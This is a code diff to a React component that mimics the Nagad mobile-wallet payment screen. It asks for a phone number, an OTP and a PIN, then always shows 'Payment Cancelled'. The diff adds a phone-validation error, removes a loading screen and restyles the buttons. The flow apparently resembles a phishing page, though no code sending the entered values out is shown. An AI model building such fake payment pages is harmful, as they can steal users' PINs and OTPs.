@@ -6,7 +6,6 @@ import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 
 const NagadPayment = () => {
   const navigate = useNavigate();
-  const [isLoading, setIsLoading] = useState(true);
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
@@ -15,25 +14,21 @@ const NagadPayment = () => {
   const [pinDigits, setPinDigits] = useState<string[]>(Array(4).fill(""));
   const [redirectTimer, setRedirectTimer] = useState(5);
   const [language, setLanguage] = useState<'bn' | 'en'>('en');
+  const [phoneError, setPhoneError] = useState("");
 
   const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpInputRef = useRef<HTMLInputElement | null>(null);
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   useEffect(() => {
-    const timer = setTimeout(() => setIsLoading(false), 2000);
-    return () => clearTimeout(timer);
-  }, []);
-
-  useEffect(() => {
-    if (!isLoading && !showFailedView) {
+    if (!showFailedView) {
       setTimeout(() => {
         if (showPinView) pinInputRefs.current[0]?.focus();
         else if (showOtpView) otpInputRef.current?.focus();
         else phoneInputRefs.current[0]?.focus();
       }, 100);
     }
-  }, [isLoading, showOtpView, showPinView, showFailedView]);
+  }, [showOtpView, showPinView, showFailedView]);
 
   const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
   const getPhoneNumber = () => phoneDigits.join("");
@@ -73,7 +68,10 @@ const NagadPayment = () => {
     if (e.key === "Backspace" && !digits[index] && index > 0) refs.current[index - 1]?.focus();
   };
 
-  const handleConfirm = () => { if (isValidNumber()) setShowOtpView(true); };
+  const handleConfirm = () => {
+    if (isValidNumber()) { setPhoneError(""); setShowOtpView(true); }
+    else setPhoneError("Invalid mobile number");
+  };
   const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); } };
   const handlePinConfirm = () => { if (isValidPin()) { setShowPinView(false); setShowFailedView(true); setRedirectTimer(5); } };
   const handleClose = () => navigate("/");
@@ -121,11 +119,7 @@ const NagadPayment = () => {
     <div className="min-h-screen flex flex-col items-center justify-center bg-gray-300 p-0">
       <div className="w-full h-screen flex flex-col overflow-hidden border-2 border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
-      {isLoading ? (
-        <div className="flex-1 flex flex-col items-center justify-center">
-          <p className="text-white text-sm font-medium">Loading...</p>
-        </div>
-      ) : showFailedView ? (
+      {showFailedView ? (
         <div className="flex-1 flex flex-col items-center justify-center">
           <XCircle className="w-12 h-12 text-white mb-4" strokeWidth={1.5} />
           <h3 className="text-white text-center text-lg font-medium mb-2">Payment Cancelled</h3>
@@ -187,6 +181,9 @@ const NagadPayment = () => {
               <div className="flex flex-col items-center">
                 <p className="text-white text-center text-sm font-semibold mb-3">Your Nagad Account Number</p>
                 {renderPhoneInputs()}
+                {phoneError && (
+                  <p className="text-yellow-300 text-xs font-medium mt-2">{phoneError}</p>
+                )}
               </div>
             )}
           </div>
@@ -205,19 +202,15 @@ const NagadPayment = () => {
           <div className="px-5 py-2 flex gap-8 justify-center">
             <button
               onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
-              disabled={showPinView ? !isValidPin() : showOtpView ? !isValidOtp() : !isValidNumber()}
-              className={`px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors ${
-                (showPinView ? isValidPin() : showOtpView ? isValidOtp() : isValidNumber())
-                  ? 'hover:bg-white/90' : 'opacity-50 cursor-not-allowed'
-              }`}
+              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
             >Proceed</button>
             {showOtpView && (
               <button onClick={() => setOtpValue("")}
-                className="px-6 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold hover:bg-white/90 transition-colors"
+                className="px-6 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
               >Resend Code</button>
             )}
             <button onClick={handleClose}
-              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold hover:bg-white/90 transition-colors"
+              className="px-8 bg-white text-[#C41E3A] py-1.5 rounded text-xs font-semibold transition-colors hover:bg-transparent hover:text-white border border-white"
             >Close</button>
           </div>
 
